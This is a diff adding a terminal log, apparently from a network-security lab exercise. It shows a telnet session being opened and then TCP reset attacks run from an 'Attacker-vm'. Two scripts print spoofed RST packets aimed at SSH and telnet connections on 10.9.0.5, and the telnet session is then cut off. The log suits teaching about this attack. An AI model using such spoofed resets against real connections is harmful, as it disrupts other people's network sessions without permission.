@@ -1,0 +1,84 @@
+root@d5c1ac18ddb9:/# telnet 10.9.0.5
+Trying 10.9.0.5...
+Connected to 10.9.0.5.
+Escape character is '^]'.
+Ubuntu 20.04.1 LTS
+58a9ed39547c login: seed
+Password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.11.0-1029-gcp x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Fri Feb 11 10:26:25 UTC 2022 from user2-10.9.0.7.net-10.9.0.0 on pts/3
+
+root@58a9ed39547c:/# netstat -tna
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.11:35183        0.0.0.0:*               LISTEN     
+tcp        0      0 10.9.0.5:23             10.9.0.7:49714          ESTABLISHED
+tcp6       0      0 :::22                   :::*                    LISTEN
+
+root@Attacker-vm:/volumes# ./reset_ssh.py
+version    : BitField  (4 bits)                  = 4               (4)
+ihl        : BitField  (4 bits)                  = None            (None)
+tos        : XByteField                          = 0               (0)
+len        : ShortField                          = None            (None)
+id         : ShortField                          = 1               (1)
+flags      : FlagsField  (3 bits)                = <Flag 0 ()>     (<Flag 0 ()>)
+frag       : BitField  (13 bits)                 = 0               (0)
+ttl        : ByteField                           = 64              (64)
+proto      : ByteEnumField                       = 6               (0)
+chksum     : XShortField                         = None            (None)
+src        : SourceIPField                       = '10.9.0.6'      (None)
+dst        : DestIPField                         = '10.9.0.5'      (None)
+options    : PacketListField                     = []              ([])
+--
+sport      : ShortEnumField                      = 51036           (20)
+dport      : ShortEnumField                      = 22              (80)
+seq        : IntField                            = 488613973       (0)
+ack        : IntField                            = 0               (0)
+dataofs    : BitField  (4 bits)                  = None            (None)
+reserved   : BitField  (3 bits)                  = 0               (0)
+flags      : FlagsField  (9 bits)                = <Flag 4 (R)>    (<Flag 2 (S)>)
+window     : ShortField                          = 8192            (8192)
+chksum     : XShortField                         = None            (None)
+urgptr     : ShortField                          = 0               (0)
+options    : TCPOptionsField                     = []              (b'')
+root@Attacker-vm:/volumes#  
+root@Attacker-vm:/volumes# ./reset_telnet.py
+version    : BitField  (4 bits)                  = 4               (4)
+ihl        : BitField  (4 bits)                  = None            (None)
+tos        : XByteField                          = 0               (0)
+len        : ShortField                          = None            (None)
+id         : ShortField                          = 1               (1)
+flags      : FlagsField  (3 bits)                = <Flag 0 ()>     (<Flag 0 ()>)
+frag       : BitField  (13 bits)                 = 0               (0)
+ttl        : ByteField                           = 64              (64)
+proto      : ByteEnumField                       = 6               (0)
+chksum     : XShortField                         = None            (None)
+src        : SourceIPField                       = '10.9.0.7'      (None)
+dst        : DestIPField                         = '10.9.0.5'      (None)
+options    : PacketListField                     = []              ([])
+--
+sport      : ShortEnumField                      = 49714           (20)
+dport      : ShortEnumField                      = 23              (80)
+seq        : IntField                            = 1233915195      (0)
+ack        : IntField                            = 0               (0)
+dataofs    : BitField  (4 bits)                  = None            (None)
+reserved   : BitField  (3 bits)                  = 0               (0)
+flags      : FlagsField  (9 bits)                = <Flag 4 (R)>    (<Flag 2 (S)>)
+window     : ShortField                          = 8192            (8192)
+chksum     : XShortField                         = None            (None)
+urgptr     : ShortField                          = 0               (0)
+options    : TCPOptionsField                     = []              (b'')
+
+seed@58a9ed39547c:~$ Connection closed by foreign host.
+
